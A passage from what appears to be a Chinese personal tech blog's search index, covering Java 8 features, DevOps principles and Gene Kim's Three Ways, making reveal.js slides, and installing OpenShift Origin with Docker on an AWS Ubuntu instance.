anyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 iterator 还有一种操作被称为 short-circuiting。用以指： 对于一个 intermediate 操作，如果它接受的是一个无限大（infinite/unbounded）的 Stream，但返回一个有限的新 Stream。 对于一个 terminal 操作，如果它接受的是一个无限大的 Stream，但能在有限的时间计算出结果。 包括：anyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 limit 注意 Stream 不是数据结构 所有 Stream 的操作必须以 lambda 表达式为参数 不支持索引访问，你可以请求第一个元素，但无法请求第二个，第三个，或最后一个。 很多 Stream 操作是向后延迟的，一直到它弄清楚了最后需要多少数据才会开始。 可以是无限的，limit(n) 和 findFirst() 这类的 short-circuiting 操作可以对无限的 Stream 进行运算并很快完成。 调用paralle()构造并行stream 更多例子: Java 8 Stream Tutorial Examples Parallel StreamThink Twice Before Using Java 8 Parallel Streams Stream 的并行功能适用于计算密集且运行在多核操作系统上的应用，而非 IO 密集型。因为Parallel Stream 采用的是 jdk7 中引入的 ForkJoin框架， 使用分治法(Divide-and-Conquer Algorithm)管理线程池，这种方案在进程阻塞的情况下会导致事倍功半的效果，相比串行方案还会浪费一些计算资源。 具体可参见这篇文章：深入浅出parallelStream （三）新增类库Date-Time PackageJava 8通过发布新的Date-Time API (JSR 310)来进一步加强对日期与时间的处理。在旧版的 Java 中，日期时间 API 存在诸多问题，第三方包又些许存在一些兼容性问题，Java 8 在 java.time 包下提供了很多新的 API，包含以下相应的包： java.time包：这是新的Java日期/时间API的基础包，所有的主要基础类都是这个包的一部分，如：LocalDate, LocalTime, LocalDateTime, Instant, Period, Duration等等。所有这些类都是不可变的和线程安全的，在绝大多数情况下，这些类能够有效地处理一些公共的需求。 java.time.chrono包：这个包为非ISO的日历系统定义了一些泛化的API，我们可以扩展AbstractChronology类来创建自己的日历系统。 java.time.format包：这个包包含能够格式化和解析日期时间对象的类，在绝大多数情况下，我们不应该直接使用它们，因为java.time包中相应的类已经提供了格式化和解析的方法。 java.time.temporal包：这个包包含一些时态对象，我们可以用其找出关于日期/时间对象的某个特定日期或时间，比如说，可以找到某月的第一天或最后一天。你可以非常容易地认出这些方法，因为它们都具有“withXXX”的格式。 java.time.zone包：这个包包含支持不同时区以及相关规则的类。 Optional 类优雅的空指针处理 身为一名Java程序员，大家可能都有这样的经历：调用一个方法得到了返回值却不能直接将返回值作为参数去调用别的方法。我们首先要判断这个返回值是否为null，只有在非空的前提下才能将其作为其他方法的参数。这正是一些类似Guava的外部API试图解决的问题。一些JVM编程语言比如Scala、Ceylon等已经将对在核心API中解决了这个问题。新版本的Java，比如Java 8引入了一个新的Optional类。Optional类的Javadoc描述如下： 这是一个可以为null的容器对象。如果值存在则isPresent()方法会返回true，调用get()方法会返回该对象。 Optional 类提供了许多方法用于解决空指针的问题，下面列举几个个我认为最常用的方法，完整版可参见这篇文章：Java 8 Optional类深度解析 ifPresent 如果Optional实例有值则为其调用consumer，否则不做处理，For example: //ifPresent方法接受lambda表达式作为参数。 //lambda表达式对Optional的值调用consumer进行处理。 name.ifPresent((value) -&gt; { System.out.println(&quot;The length of the value is: &quot; + value.length()); }); orElse 如果Optional实例有值则将其返回，否则返回orElse方法传入的参数，For example： //如果值不为null，orElse方法返回Optional实例的值。 //如果为null，返回传入的消息。 //输出：There is no value present! System.out.println(empty.orElse(&quot;There is no value present!&quot;)); //输出：Sanaulla System.out.println(name.orElse(&quot;There is some value!&quot;)); orElseGet orElseGet与orElse方法类似，区别在于得到的默认值。orElse方法将传入的字符串作为默认值，orElseGet方法可以接受Supplier接口的实现用来生成默认值，For example： //orElseGet与orElse方法类似，区别在于orElse传入的是默认值， //orElseGet可以接受一个lambda表达式生成默认值。 //输出：Default Value System.out.println(empty.orElseGet(() -&gt; &quot;Default Value&quot;)); //输出：Sanaulla System.out.println(name.orElseGet(() -&gt; &quot;Default Value&quot;)); map 如果有值，则对其执行调用mapping函数得到返回值。如果返回值不为null，则创建包含mapping返回值的Optional作为map方法返回值，否则返回空Optional，For example： //map方法执行传入的lambda表达式参数对Optional实例的值进行修改。 //为lambda表达式的返回值创建新的Optional实例作为map方法的返回值。 Optional&lt;String&gt; upperName = name.map((value) -&gt; value.toUpperCase()); System.out.println(upperName.orElse(&quot;No value found&quot;)); Base64在Java 8中，Base64编码已经成为Java类库的标准。Java 8 内置了 Base64 编码的编码器和解码器。Base64工具类提供了一套静态方法获取下面三种BASE64编解码器： 基本：输出被映射到一组字符A-Za-z0-9+/，编码不添加任何行标，输出的解码仅支持A-Za-z0-9+/。 URL：输出映射到一组字符A-Za-z0-9+_，输出是URL和文件。 MIME：输出隐射到MIME友好格式。输出每行不超过76字符，并且使用’\\r’并跟随’\\n’作为分割。编码输出最后没有行分割。 JavaFXJavaFX主要致力于富客户端开发，以弥补swing的缺陷，主要提供图形库与media库，支持audio,video,graphics,animation,3D等，同时采用现代化的css方式支持界面设计。 具体可参见：Java 8新特性探究（十三）JavaFX 8新特性以及开发2048游戏 （四）JVM 升级JVM 为了方便内存回收将堆内存分为新生代（Young generation）， 老年代（Old generation）， 持久代（ permanent generation ）（如下图所示）具体参考：成为JavaGC专家（1）—深入浅出Java垃圾回收机制 Java8 移除了 Permanent Generation，取而代之的是一个叫 MetaSpace（元空间） 的内存空间（如下图所示），MetaSpace 使用的是本地内存（Native heap），带来的最大好处是不会再有 java.lang.OutOfMemoryError: PermGen 的问题，MetaSpace 回根据使用情况自动扩容，其理论最大值即为操作系统所能提供的内存最大值；另外 MetaSpace 的 GC 扫描只会发生在 MetaSpace 达到 MaxMetaspaceSize 设置的上限的时候，减少 GC 扫描次数在一定程度上优化了 JVM 的性能。 具体参照：Java 8: From PermGen to Metaspace 关于 JVM 是什么：【转】JVM介绍——不得不知的JVM （五）新工具新的编译工具，如：Nashorn JavaScript引擎 jjs、 类依赖分析器jdeps。具体参见：官方文档 Nashorn JavaScript 引擎Nashorn 一个 javascript 引擎。从JDK 1.8开始，Nashorn取代Rhino(JDK 1.6, JDK1.7)成为Java的嵌入式JavaScript引擎。Nashorn完全支持ECMAScript 5.1规范以及一些扩展。它使用基于JSR 292的新语言特性，其中包含在JDK 7中引入的 invokedynamic，将JavaScript编译成Java字节码。 更多参见：Java 8新特性探究（十二）Nashorn ：新犀牛 （六）安全众多安全性上的提提升，如更好的 TSL/SSL 支持，改进加密算法等等，具体参见官方文档 云时代 Java最开始接触 Java 了解到 Java 最大的优势（也是 Java 诞生的初衷）就是它的跨平台性和易于移植，其实 JVM 也是一种容器，但是这种容器特性正在被Linux学习与赶超，Docker 之类容器可以在本地笔记本或电脑上运行，然后同样可以部署到云上运行。当在云上运行时，Kubernetes 能够以一种可控的方式升级容器从而实现运行管理一批容器，如同一个大型船队或舰队一样，你可以控制它们的流量访问量，可以指定多少个容器来扩展支撑一个服务的运行，随着访问量提升，你通过增加容器数量能够整个系统的负载能力。 当然，Java 的大型分布式系统越来越多，Java在云计算与分布式系统中还是扮演主要角色，形成一个大型的生态圈。当我们站在泰山之上，一览众山小，当你在全球拥有多个数据中心时，语言已经变得不那么重要了，关键是架构设计。 Refer: Java的历史 Java 20年：历史与未来 成熟的毛毛虫：Java8 http://www.runoob.com/java/java8-new-features.html 深入浅出 Java 8 Lambda 表达式 Java 8 Method Reference: How to Use it http://colobu.com/2014/10/28/secrets-of-java-8-functional-interface/ http://blog.csdn.net/zxhoo/article/details/38349011 http://ebnbin.com/2015/12/20/java-8-default-methods/ https://nkcoder.github.io/2016/01/24/java-8-stream-api/ http://www.jianshu.com/p/5b800057f2d8 http://www.importnew.com/14140.html http://brianway.github.io/2017/03/29/javase-java8/ http://www.sczyh30.com/posts/Java/jvm-metaspace/","tags":[{"name":"Java","slug":"Java","permalink":"https://www.duyidong.com/tags/Java/"},{"name":"代码","slug":"代码","permalink":"https://www.duyidong.com/tags/代码/"}]},{"title":"DevOps 从理论到实践","date":"2017-07-14T10:35:34.000Z","path":"2017/07/14/what-is-devops/","text":"本周六应邀参加了 FreeCodeCamp社区的一次线下活动，主题为《DevOps从理论到实践》，借此机会整理一下近年来看到听到的对于 DevOps 的定义，并产出一些自己的观点。 什么是DevOpsDevOps 是一个流行词 如今 DevOps 已经成为一个流行词，很多公司都在说自己在做 DevOps，但是每个人、每家公司理解的 DevOps 又不尽相同，从 DevOps 诞生的第一天起，如何定义 DevOps 就是一个争论不休的话题。 这里有一篇文章，笔者认为基本诠释了 DevOps 的定义：DevOps 是什么不是什么 如果你没有耐心把这篇文章看完，维基百科还给出了一个太长不读版： DevOps (a clipped compound of “development” and “operations”) is a software development and delivery process that emphasizes communication and collaboration between product management, software development, and operations professionals.It seeks to automate the process of software integration, testing, deployment, and infrastructure changes by establishing a culture and environment where building, testing, and releasing software can happen rapidly, frequently, and more reliably. 归纳成三点： DevOps 是一种强调沟通与协作的软件交付过程。它包括产品管理，软件开发及运营等各个方面。 DevOps 自动化软件集成，测试，部署以及基础设施的变更。 它的目标是建立一种文化和环境，使得软件的构建、测试、交付更快，更频繁，更可靠。 DevOps 的由来参见 DevOps编年史 和一个 Youtube 小视频： The (Short) History of DevOps 这里我想多提一句的是持续交付和 DevOps 的关系和差别，参照维基百科 对 DevOps 和持续交付的区别进行解释，DevOps 涵盖的范围比持续交付更宽，它包含了文化，强调团队协作和自动化；而持续交付侧重于频繁、快速 地执行交付流程，两者相辅相成，却又有所区别。 Continuous delivery and DevOps are similar in their meanings and are often conflated, but they are two different concepts. DevOps has a broader scope, and centers around the cultural change, specifically the collaboration of the various teams involved in software delivery (developers, operations, quality assurance, management, etc.), as well as automating the processes in software delivery.Continuous delivery, on the other hand, is an approach to automate the delivery aspect, and focuses on bringing together different processes and executing them more quickly and more frequently. Thus, DevOps can be a product of continuous delivery, and CD flows directly into DevOps. DevOps 理论框架因为DevOps源自草根，缺乏自上而下的理论支撑，所以如何定义 DevOps 成了 DevOps 社区里面的一个大难题。一些 DevOps 从业者，纷纷设定自己的 DevOps 框架。其中比较有名的框架有Damon Edwards所定义并被 Jez Humble（持续交付作者之一） 所修订的CALMS，和Gene Kim所定义的The Three Ways。 The Three Ways The First Way： System Thinking （系统思考：强调全局优化，避免局部优化） The Second Way： Amplify Feedback Loops （经过放大的反馈回路：创建从开发过程下游至上游的反馈环） The Third Way： Culture of Continual Experimentation And Learning（持续做试验和学习的文化：持续做试验，承担风险、从失败中学习；通过反复实践来达到精通） CLAMS Culture – 文化：公司各个角色一起担当业务变化，实现有效协作和沟通；建立包括运维在内的跨职能协作文化,具有共同目标的一体化团队。这是DevOps运动的根本 Automation – 自动化：在价值链中尽量除去手工步骤；自动化一切可以自动化的步骤，降低部署和发布的难度 Lean – 精益：运用精益原则更频繁地交付价值；以精益的方式小步快跑，对过程与技术进行持续改善 Metrics – 度量：度量并使用数据来优化交付周期；通过建立有效的监控与度量手段来获得反馈,推动产品和团队的持续改进, 支持业务决策 Sharing – 分享：分享成功和失败的经验来相互学习。 为什么要实践 DevOps了解了 DevOps 的历史，再来看为什么要实践 DevOps，笔者认为主要有以下三点： 更短的交付周期，生产环境部署频率越来越快，简化生产部署流程，且自动化不停机部署 更高的价值，形成特性提出到运营数据、用户反馈验证的实验性交付闭环，基于实际用户反馈调整计划和需求 更好的质量保障，在代码检查，功能和非功能验证，以及部署各方面建立较完善的质量保障体系，尤其是自动化测试集 更高绩效的团队，包含业务，开发测试，和运维职能在内的一体化团队，以产品交付为共同目标紧密协作，共同承担责任 DevOps 在技术领域的实践DevOps运作包括文化（全功能，自运维）和技术（自动化，度量反馈）两方面，而技术能力的改进主要关注以下六个领域： 内建质量体系通过持续代码评审，静态分析，自动化测试，自动部署验证等手段构成一套有效的质量保障体系。 主要实践包括： TDD：测试驱动开发的思想，保证代码质量和不偏离业务需求的技术实现 结对编程和代码审查，依靠团队的自治性让团队成员互相监督和审查代码质量 自动化测试，高自动化，且高频率运行的测试，保证测试用例质量的同时保证了交付软件的质量 持续部署通过自动化的构建，部署过程快速频繁地将软件交付给用户，提高吞吐量；同时保障过程的安全，平滑，可视。 主要实践包括： 在已经做到持续集成的情况下，引入持续部署，每次提交均会出发构建并执行部署 蓝绿部署，用于实现零宕机发布新版本 金丝雀发布，用于使应用发布流程具备快速试错的能力 持续监控持续对运行环境在系统，应用层面进行监控，及时发现风险或问题，保障系统运行的稳定性。 主要实践包括： 监控预警，在项目开始初期就引入监控，让整个团队实时能够收到关于产品各个维度数据的反馈 日志聚合，便于错误追踪和展示 分析，利用搜集到的数据实时分析，利用分析结果指导开发进度 度量与反馈通过对用户行为或业务指标的度量或反馈收集，为产品的决策提供依据。 主要实践包括： 持续集成反馈，对代码构建质量，代码质量审查的反馈 测试反馈，对软件质量，功能性的测试，给到业务的反馈 运营数据反馈，新功能上线后对业务影响的反馈，用于指导业务人员提新的需求 环境管理通过对服务器环境的定义，自动化建立和配置、更新等提高基础设施管理的效率，一致性，并更有效利用资源，可伸缩的架构，保证服务的健壮性。 主要实践包括： 弹性架构，保证服务的吞吐量和具备灵活变更的能力 自动化部署脚本，想胶水一样，用于解决一些工程实践不够完善的流程之间的衔接 基础设施即代码，用代码定义基础设施，便于环境管理，追踪变更，以及保证环境一致性 松耦合架构对传统应用架构进行领域组件化，服务化，提升可测试性和可部署性。 主要实践包括： 采用弹性基础设施，比如公有云服务或是 PaaS（Platform as a Service） 平台 构建为服务应用 引入契约测试 典型DevOps的持续交付流水线全景图 软件开发全生命周期的持续优化 未来 &amp; 趋势 DevOps 话语权越来越多被平台厂商掌握 ​ 在 DevOps 实践的第一阶段，往往会是 Jenkins, Nexus, Ansible, Shell 等一系列工具的拼凑组合，上手难度大，维护成本高，开发体验不好。随着 DevOps 日渐成熟，以 AWS、Pivotal、RedHat 为代表的一些公司分别退出自己的 “DevOps产品”，或是一套完整的工具链，或者直接整合到一个 PaaS 平台，甚至一些产品直接将“敏捷”，“精益”的概念也整合到产品中，直接可以把一家公司的全部业务放到平台上，这和最近大热的“数字化平台战略”也是相吻合的。 ​ 不管怎样，这些平台厂商一边卖自己的产品一边重新定义着 DevOps，随着平台的完善，DevOps 已经变得越来越不重要，我一直觉得最好的 DevOps 团队应该是“润物细无声”的，就是一个团队不用提 DevOps，整个团队很自然地就能关注到业务价值的交付，且能有序地按照高质量，高效率的要求去做，平台或许能帮助我们做到这一点。 容器化 &amp; 微服务仍然是 DevOps 应用和发展的主要领域 ​ 容器化、微服务天然适合小而全的功能团队，且一个个自治的服务也很复合 DevOps 端到端交付团队的设计，近年随着容器化技术（Docker）的发展，容器管理（Kubernetes）的日渐成熟（据悉，github 已经将它们的一部分产品环境灰度发布到了 kubernetes 上，京东也将他们的服务百分之六十采用了 kubernetes 管理），DevOps 和微服务成为了相辅相成的两个趋势。 安全成为推动 DevOps 全面发展的重要力量 ​ 安全是 DevOps 永远绕不开的话题，也往往是新技术在传统行业（例如金融和电信）应用中的最大阻碍。一方面，组织结构的转型迫使企业要打破原先的部门墙，这意味着很多原先的控制流程不再适用。另一方面，由于大量的 DevOps 技术来源于开源社区，缺乏强大技术实力的企业在应用相关技术时不免会有所担忧。 ​ DevOps 全局优化的特点与安全社区提出的 “Build Security In”也特别吻合，加之越来越多安全易用的工具涌现，DevOpsSec 会越来越被人们熟知。 参考资料： http://insights.thoughtworkers.org/instantiate-the-principles-of-devops/ http://www.jianshu.com/p/5781489e8431","tags":[{"name":"持续交付","slug":"持续交付","permalink":"https://www.duyidong.com/tags/持续交付/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"},{"name":"敏捷","slug":"敏捷","permalink":"https://www.duyidong.com/tags/敏捷/"},{"name":"DevOps文化","slug":"DevOps文化","permalink":"https://www.duyidong.com/tags/DevOps文化/"},{"name":"CALMS","slug":"CALMS","permalink":"https://www.duyidong.com/tags/CALMS/"}]},{"title":"DevOps的三种方式","date":"2017-07-12T14:50:38.000Z","path":"2017/07/12/the-three-ways-understanding-devops/","text":"本文翻译自 Gene Kim 的博客 The Three Ways: The Principles Underpinning DevOps 前言这篇博客中提到的“三种方式“源自 《DevOps Handbook》 及《凤凰项目》（The Phoenix Project: A Novel About IT, DevOps, and Helping Your Business Win.），这三种方式描述了构成 DevOps 的理论框架、流程、实践及价值观和哲学。 感谢《Lean IT》的作者 Mike Orzen 为此文提供宝贵建议。 三种方式下文将介绍三种模式及在该种模式指导下的 DevOps 实践。 第一种方式： 系统思考 第一种方式强调全局优化，而非局部改进。— 大到部门职能划分（例如研发部和运维部门），小到个人（开发和系统工程师）。 这种方式将关注点放在整个业务价值流上。换句话说，整个团队应该关注在从需求被定义到开发，再到运维这个过程，直到价值被以服务的形式交付给最终用户。 将这种方式带到实践中的产出便是永远不要将已知的缺陷传递到下游工作，永远不要为了局部优化影响了整体价值流交付，总是为了增加价值流动努力，永远追求对架构的深刻理解。 涉及到这种方式的实践有： 所有环境和代码使用同一个仓库，将软件包纳入版本管理 团队共同决定发布流程 保持 DEV、TEST、PRODUCTION 环境的一致性 自动化回归测试 小步提交，每日部署；而不是一次部署大量变更 更快、更频繁发布 第二种方式：经过放大的反馈回路 第二种方式是创建从开发过程下游至上游的反馈环。几乎所有的流程改进都是为了从时间上缩短和从覆盖面上放大反馈循环，从而可以不断地进行必要的改正。 第二种方式的产出是关注到价值流中所有涉及到的用户，包括价值流内部和外部的，缩短和放大反馈回路，并且可以随时定位到需要改进的地方。 涉及到这种方式的实践有： 代码审查及配置变更检查 有纪律的自动化测试，使许多同时的小型敏捷团队能够有效地工作 尽早设置监控预警 修复 bug 为团队最高优先级 团队成员之间高度互相信任 团队之间保持沟通和良好合作 第三种方式：持续做试验和学习的文化 第三种方式提倡持续做试验，承担风险、从失败中学习；通过反复实践来达到精通。 我们需要实验和冒着失败的风险，及时不断地尝试将我们置于一个危险的境地，我们要通过反复试错来掌握使我们远离危险的技能。 第三种方式的输出为为改善日常工作分配时间、奖励团队冒险精神，将错误人工引入系统以提高系统健壮性。 最具有代表性的就是 Netfilx 的 Chaos monkey ，Netflix 在他们的生产环境搭建一个服务用于定时随机关闭服务器，用以模拟服务器正常损坏或服务异常，他们的系统长期在这种环境下运行，“服务器故障”成为系统每日都要面临的问题，因此当服务器真的以外故障时不会对系统整体造成任何的影响。 译者后记全局优化、快速反馈、鼓励失败。我们发现其实敏捷、精益、持续交付、DevOps中间有很多相似的东西。 参考资料: https://es.slideshare.net/SonatypeCorp/devops-connect-josh-corman-and-gene-kim-discuss-devopssec","tags":[{"name":"翻译","slug":"翻译","permalink":"https://www.duyidong.com/tags/翻译/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"},{"name":"理论框架","slug":"理论框架","permalink":"https://www.duyidong.com/tags/理论框架/"}]},{"title":"如何制作在线幻灯片","date":"2017-06-20T08:20:33.000Z","path":"2017/06/20/reveal-js-quick-start/","text":"都说不会做幻灯片的程序员不是好架构师，工作中有很多场合需要用到幻灯片。最近在准备一个对外分享，内容比较简单，顺手尝试了一下使用 reveal js制作一个在线幻灯片。 效果展示：https://cdn.rawgit.com/ADU-21/cd-in-cloud-reveal-js/784e1a49/index.html 这个幻灯片中包含文本、图片、视频，下面我会逐一讲解是如何实现的。 价值 解决微软的 PowerPoint 和 Mac keynote 跨平台不兼容问题 传统幻灯片需要拷来拷去，在线幻灯片只需要一个 URL 就可以访问，避免忘带 U 盘的尴尬 在线幻灯片本质上是 html 文件，也可以在无网络环境播放 用到的资源 reveal js ：将幻灯片文本内容渲染为 html github : 用于存放幻灯片文件 rawgit : 将 GitHub 中的 html 正常加载，并添加 CDN 开始第一步： Fork 官方 Repo前往https://github.com/hakimel/reveal.js 点击 fork将代码复制到自己账号下。 git clone https://github.com/&lt;you account id&gt;/reveal.js 这时你就得到了一个可运行的 reveal js 模板，运行根目录下的 index.html 即可预览。 README 中提供了很多配置编辑的方式，你要是没耐心看就跟着我继续吧。 第二步： 编辑 index.html找到&lt;div class=&quot;slides&quot;&gt; ，这里是幻灯片正文的开始，在这个标签中添加如下代码，开启 markdown编辑模式： &lt;section data-markdown data-separator=&quot;---&quot; data-separator-vertical=&quot;--&quot;&gt; &lt;script type=&quot;text/template&quot;&gt; ### 正文在此 &lt;/script&gt; &lt;/section&gt; 现在你可使用 markdown 语法开始编辑幻灯片内容了。 基本编辑方式--- 表示横向分页。 -- 表示竖向分页，通常一列可以作为一个章节。 # 标题 - 列表 插入图片插入图片有两种方式，基本的插入 markdown 语法就可以支持： ![](https://hostname.com/image.png) 外部引用。 考虑到一些时候我们需要在无网络的情况下播放 幻灯片，所以通常还是将图片保存到本地再添加。 ![](images/image.png) 这种方式需要在根目录下创建一个叫 image 的文件夹，把图片放入其中命名为 imag.png。 如果要对图片又更复杂的支持，比如调整长宽，则需要写 html 代码，如： &lt;img src=&quot;images/image.jpg&quot; alt=&quot;&quot; width=&quot;500px&quot;&gt; 插入视频以 youtube 视频为例，首先使用 youtube-dl 下载视频： brew install youtube-dl # 安装 youtube-dl youtube-dl https://www.youtube.com/watch?v=oHg5SJYRHA0 下载视频默认格式为 webm 格式，这是一种支持 HTML5 的视频文件格式，可以使用浏览器打开，将视频添加到幻灯片中： &lt;section data-background-video=&quot;your_video_name.webm&quot;&gt; 幻灯片 播放到这一页的时候就会开始自动播放视频。 第三步： 对外访问将编辑好后的 reveal js 这个项目提交到 GitHub 上： git add . git commit -m &quot;add my slides&quot; git push origin master 从网页访问你的 repo，以示例中的幻灯片为例： https://github.com/ADU-21/cd-in-cloud-reveal-js/blob/master/index.html ，我们发现幻灯片并没有被正常渲染，而是以源代码的方式展示。这个时候就需要用到第三方工具将 github 代码库中的 html 文件按照期望的方式对外暴露使其访问，具体操作： 打开 http://rawgit.com/ 在中间的输入框输入 https://github.com/&lt;your github id&gt;/cd-in-cloud-reveal-js/blob/master/index.html 得到 production url 和 development url两个链接 Production url 是带有 CDN 的，和 github 的同步会存在一定的延迟， developement url 的更新会及时一些，不过访问速度相对会没那么快。 现在访问生成的 URL，你的在线幻灯片就已经制作完毕。 以上，不一定是最佳实践，不过经笔者亲测，行之有效。","tags":[{"name":"工具","slug":"工具","permalink":"https://www.duyidong.com/tags/工具/"},{"name":"reveal js","slug":"reveal-js","permalink":"https://www.duyidong.com/tags/reveal-js/"},{"name":"在线幻灯片","slug":"在线幻灯片","permalink":"https://www.duyidong.com/tags/在线幻灯片/"}]},{"title":"PaaS 平台（三）-- Openshift 使用","date":"2017-06-15T10:27:41.000Z","path":"2017/06/15/openshift-quick-start/","text":"Openshift 是一个基于 Kubernetes 和 Docker 的 PaaS 平台。 Openshift 概念补充我们在上文–Kubernetes 介绍中已经提到 Kubernetes 引入了一些概念，Openshift 在此基础之上又对这些概念进行了封装。了解 Openshift 除了了解它的架构以外，还要了解他抽象出来的概念。 ImageStream: 对 Docker Image 的抽象，Docker image 只是一个二进制文件实体，而 ImageStream 可以带有状态，可以对外部程序的访问做出相应。 BuildConfig: 对 Dockerfile 的抽象，上文已经说到 Openshift 中的 Pod 实际上是由多个 Container 构成的，这些 Conatainer 仍然是运行时的 Image，这些 Image 的构建过程就是由 BuildConfig 决定的，不同于 Dockerfile，BuildConfig 可以支持将 gitrepo, Dockerfile, Binary, Image, Input Secrite(Openshift 定义的另一种资源类型，用于存储敏感信息), 二进制软件包，这些资源类型统统打到一个 ImageStream 里面，在“构建”这个动作的上下游还支持事件触发，比如定义“gitrepo的提交会触发一次构建”，以及“在构建完成后执行一次测试”。 DeploymentConfig: 对 Replication Controller 的封装，定义了应用的运行时架构。 Route: Kubernetes 定义了 Service 用于实现服务之间的隔离和调用，Openshift 在此之上增加了一层 Route，至此 Service 可以面向内网环境，而由 Route 来真正对外提供服务。 将以上流程串起来，在 Openshift 上一个应用的诞生就应该是如下流程： 熟悉了 Openshift 的基本概念，下面我们可以动手搭建一个 Openshift Origin 版，并在上面部署一个应用。 Openshift 安装这里安装的是 Openshift 社区版，官方也有提供 minishift（需要使用虚拟机）以及 Container 的方式安装，这里使用的方法是用 oc (openshift-cli)，是最简单，也是官方现在推荐的安装方式。安装环境可以选择在 Mac 上或者是云虚拟机（Windows 不确定是否支持），我这里选择的是 AWS EC2，关于其他平台的安装，具体可参照https://github.com/openshift/origin/blob/master/docs/cluster_up_down.md 第一步：在亚马逊上申请一个 Ubuntu 的机器有几个要注意的地方： CentOS 的 Dcoker 安装可能会遇到一些问题，是由于 Docker 社区版不支持，详见这里。 如果你想实现 hook 功能，即看到代码提交触发 Openshift 内构建的效果，你需要赋予 Instance 一个公网 IP。 安全组开启外部可访问 8443 端口。 第二步：安装 Docker这里要说明的是现有 Openshift 在 docker 的最高版本下支持有些问题，经测试 1.12.1版本是稳定的。安装脚本： # Install Docker on Xenial 16.04.1 x64 # Ref https://docs.docker.com/engine/installation/linux/ubuntulinux/ # No interactive for now. export DEBIAN_FRONTEND=noninteractive # Update your APT package index. sudo apt-get -y update # Update package information, ensure that APT works with the https method, and that CA certificates are installed. sudo apt-get -y install apt-transport-https ca-certificates # Add the new GPG key. sudo apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D # Add docker.list sudo echo &quot;deb https://apt.dockerproject.org/repo ubuntu-xenial experimental&quot; &gt; /etc/apt/sources.list.d/docker.list # Update your APT package index. sudo apt-get -y update # Purge the old repo if it exists. sudo apt-get purge lxc-docker # Verify that APT is pulling from the right repository. sudo apt-cache policy docker-engine # Install the recommended package. sudo apt-get -y install linux-image-extra-$(uname -r) # Install Docker. sudo apt-get -y install docker-engine=1.12.1-0~xenial --allow-downgrades # Start the docker daemon. sudo service docker start # Validate docker version docker -v 执行最后一条命令，出现 Dokcer 版本为 1.12.1 表示安装成功。 第三步：配置 Dokcer registry编辑/etc/systemd/system/multi-user.target.wants/docker.service docker 的 service 文件，将ExecStart=/usr/bin/dockerd -H fd://这一行，替换为 ExecStart=/usr/bin/dockerd --insecure-registry 172.30.0.0/16 -H fd://，然后执行systemctl reload-daemon docker，systemctl restart docker 第四步：下载、启动 Openshift在服务器上下载openshift-origin-client-tools-v3.6.0-alpha.2-3c221d5-linux-64bit.tar.gzoc 客户端，解压后把 oc 所在路径加入环境变量，执行： oc cluster up \\ --public-hostname=ec2-13-228-41-255.ap-southeast-1.compute.amazonaws.com \\ --routing-suffix=13.228.41.255.xip.io 把以上命令中数字替换为你的 Instance 的公网 IP，即可启动一个外部可访问，应用也可以被外部访问的 Openshift 集群。 oc login system:admin可以以管理员权限登录oc login https://ec2-13-228-41-255.ap-southeast-1.compute.amazonaws.com:8443可以以任意用户名密码登录也可以直接访问 https://ec2-13-228-41-255.ap-southeast-1.compute.amazonaws.com:8443 进行网页操作。 至此，Openshift 的安装全部完成。 部署一个应用到 Openshift 上这一部分内容来自于 workshop，完整版可参照https://github.com/ADU-21/openshift-workshop 在本地安装 openshift 客户端Mac 版：openshift-origin-client-tools-v3.6.0-alpha.2-3c221d5-mac.zipWindows 版： openshift-origin-client-tools-v3.6.0-alpha.2-3c221d5-windows.zipLinux 版：openshift-origin-client-tools-v3.6.0-alpha.2-3c221d5-linux-64bit.tar.gz 下载到本地之后解压，将一个名为 oc 的可执行文件路径放到 PATH 环境变量里，确保随处可执行。然后执行： oc login https://ec2-13-228-41-255.ap-southeast-1.compute.amazonaws.com:8443，输入任意用户名密码即可登录。 部署一个应用1 创建一个项目 oc new-project [project name] Project 的作用是对 Openshift 的集群中的资源进行隔离。 2 将一个官方例子 fork 到自己的账户下，并克隆到本地： git clone https://github.com/&lt;your-github-name&gt;/nodejs-ex.git 这里包含了项目所需代码，是一个 NodeJS 的应用，稍后我们将把这个应用部署到 Openshift 上。 3 创建一个应用 oc new-app https://github.com/&lt;your-github-name&gt;/nodejs-ex.git 执行这一步命令，Openshift 会自动去查找 repo，根据代码的一些特征（比如package.json）识别这个项目类型，准备响应环境，可以通过watch oc get all的命令看到 openshift 实时创建了哪些资源，按逻辑顺序如下： bc: BuildConfig Openshift - 会先创建一个用于 Build image 的环境，然后创建一个叫做 Build 的对象，这个对象的实体是一个 Pod，在这个 Pod 中完成 Image 的构建 is: ImageStream - 用于管理 Image 的资源对象 bc: DeploymentConfig - 会创建一个 rc (Replication Controller)资源，又 rc 再去创建承载应用的 Pod svc: Service - Pod 的负载均衡器，与 Kubernetes 中提到的 Service 相同 Pod: 除了提供运行环境的 Pod，这里还有 Build Pod(构建完成之后还会存在，可以用于查看 log)，Deploy Pod(部署完成后会被销毁) 经历以上步骤，一个应用就已经在 Openshift 集群中被创建出来了。 4 创建 route oc expose svc/nodejs-ex 得到执行成功的提示后，执行oc get route，就可以用返回的地址访问你的应用了。这个时候你会看到在oc get all命令中看到有叫做route的资源被创建了。 5 清理资源 可以看到我们创建的资源都是被打上了 label 的，可以用oc get all --show-labels=true查看，删除资源也可以使用标签oc delete all -l app=nodejs-example，更粗暴的方式是直接删除整个 project，所有资源都会被清理掉：oc delete project &lt;project name&gt; Reference: https://github.com/openshift/origin/blob/master/docs/cluster_up_down.md","tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"},{"name":"PaaS","slug":"PaaS","permalink":"https://www.duyidong.com/tags/PaaS/"},{"name":"Openshift","slug":"Openshift","permalink":"https://www.duyidong.com/tags/Openshift/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://www.duyidong.com/tags/Kubernetes/"},{"name":"平台即服务","slug":"平台即服务","permalink":"https://www.duyidong.com/tags/平台即服务/"}]},{"title":"PaaS 平台（二） -- Kubernetes 介绍","date":"2017-06-15T01:38:41.000Z","path":"2017/06/15/kubernetes-infrastructure/","text":"Kubernetes 的很多概念和架构“代表了谷歌过去十余年设计、构建和管理大规模容器集群经验”。 Kubernetes 概念引入Kubernetes 